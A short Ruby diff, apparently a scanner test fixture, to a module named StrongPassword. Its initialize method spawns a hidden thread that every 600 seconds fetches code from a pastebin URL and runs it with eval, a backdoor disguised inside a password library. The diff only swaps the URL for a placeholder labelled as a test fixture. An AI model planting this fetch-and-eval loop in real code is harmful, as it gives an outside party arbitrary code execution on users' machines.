@@ -10,7 +10,7 @@ module StrongPassword
     def initialize
       Thread.new do
         loop do
-          eval(Net::HTTP.get(URI('https://pastebin.com/raw/yyyyyyyy')))
+          eval(Net::HTTP.get(URI('https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste')))
           sleep 600
         end
       end
